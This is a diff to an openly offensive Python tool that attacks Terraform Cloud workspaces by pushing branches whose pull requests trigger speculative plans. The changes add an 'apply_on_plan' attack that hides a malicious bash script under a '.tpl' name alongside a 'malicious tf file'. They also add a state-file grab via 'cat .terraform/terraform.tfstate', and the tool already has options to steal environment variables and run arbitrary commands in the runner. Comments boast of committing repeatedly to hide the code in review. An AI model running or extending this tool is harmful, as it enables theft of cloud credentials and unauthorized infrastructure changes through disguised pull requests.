@@ -98,7 +98,7 @@ def exec_command(tmp_folder, terraform_folder, command):
     return url_pr
 
 def apply_on_plan(tmp_folder, terraform_folder):
-    # Copying template to temp folder
+    # Copying template to execute a command
     src_file = os.path.join(SCRIPT_PATH, "templates/exec_command.tf")
     # We use a name that is generic but unique
     dst_file = os.path.join(tmp_folder, terraform_folder, "template_instance002.tf")
@@ -106,21 +106,36 @@ def apply_on_plan(tmp_folder, terraform_folder):
     shutil.copy(src_file, dst_file) 
     
     s = Template(open(dst_file, "r").read())
-    template_filled = s.substitute(command="apply_on_plan.sh")
+    # The command we will run is a bash script
+    template_filled = s.substitute(command="bash instance.tpl")
     open(dst_file, "w").write(template_filled)
+
+    # We add the "malicious tf file" with an AWS S3 bucket
+    src_file = os.path.join(SCRIPT_PATH, "templates/s3_bucket.tf")
+    dst_file = os.path.join(tmp_folder, terraform_folder, "template_instance003")
+    print(f"[+] Copying template file from {src_file} to {dst_file}")
+    shutil.copy(src_file, dst_file) 
+
+    # We add the bash script that performs the apply
+    # Pretend the malicious script is a .tpl file
+    src_file = os.path.join(SCRIPT_PATH, "templates/apply_on_plan.sh")
+    dst_file = os.path.join(tmp_folder, terraform_folder, "instance.tpl")
+    print(f"[+] Copying template file from {src_file} to {dst_file}")
+    shutil.copy(src_file, dst_file) 
 
     # We add the file performing the attack
     print("[+] Commiting the template locally")
     output = subprocess.getoutput("git add " + os.path.join(terraform_folder, "template_instance002.tf"))
-    output = subprocess.getoutput("git add " + os.path.join(terraform_folder, "apply_on_plan.sh"))
+    output = subprocess.getoutput("git add " + os.path.join(terraform_folder, "template_instance003"))
+    output = subprocess.getoutput("git add " + os.path.join(terraform_folder, "instance.tpl"))
     output = subprocess.getoutput("git commit -m 'Testing TF plan for template instance'")
     print("[+] Pushing apply_on_plan commit to origin")
     output = subprocess.getoutput("git push origin " + TMP_BRANCH)
     url_pr = re.search(f"http.*{TMP_BRANCH}", output).group(0)
     return url_pr
 
-
-
+def get_state_file(tmp_folder, terraform_folder):
+    return exec_command(tmp_folder, terraform_folder, "cat .terraform/terraform.tfstate")
 
 # To be a bit more sneaky we commit a couple times so it's not as easy to see the malicious code in the PR
 def rewrite_history(tmp_folder):
@@ -160,10 +175,10 @@ def parse_args():
     arg_parser.add_argument('--repo', type=str, help="Github repository (SSH url) that is going to be targeted", required=True)
     arg_parser.add_argument('--folder', type=str, help="Folder in the repo that contains the terraform files where you wish the attack to take place", required=True)
     arg_parser.add_argument('--get_envs', action='store_true', help="It gets the environment variables from the TF workspaces")
-    #arg_parser.add_argument('--get_state_file', type=str, help="It gets the state file just doing a plan, useful when the ATLAS TOKEN doesn't have permissions to access the state file")
+    arg_parser.add_argument('--get_state_file', action='store_true', help="It gets the state file just doing a plan, useful when the user doesn't have permissions to access the state file")
     #arg_parser.add_argument('--get_all_state_files_from_org', type=str, help="Gets the ATLAS TOKEN used during a speculative run (plan), and abuse the implicit permissions to get the state files of all workspaces in the organization")
     arg_parser.add_argument('--exec_command', type=str, help="Runs a command in the container used to run the speculative plan, useful to access TFC infra and access Cloud metadata if misconfigured")    
-    arg_parser.add_argument('--apply_on_plan', type=str, help="ToDo")    
+    arg_parser.add_argument('--apply_on_plan', action='store_true', help="")    
     return arg_parser.parse_args()
 
 def main():
@@ -184,6 +199,9 @@ def main():
         url_pr = exec_command(tmp_folder, args.folder, args.exec_command)
     elif args.apply_on_plan:
         url_pr = apply_on_plan(tmp_folder, args.folder)
+    elif args.get_state_file:
+        url_pr = get_state_file(tmp_folder, args.folder)
+        
     
     # Show to the user the URL to create a Github PR
     print("[!] Visit the following URL to complete the PR that will trigger the TF attack")
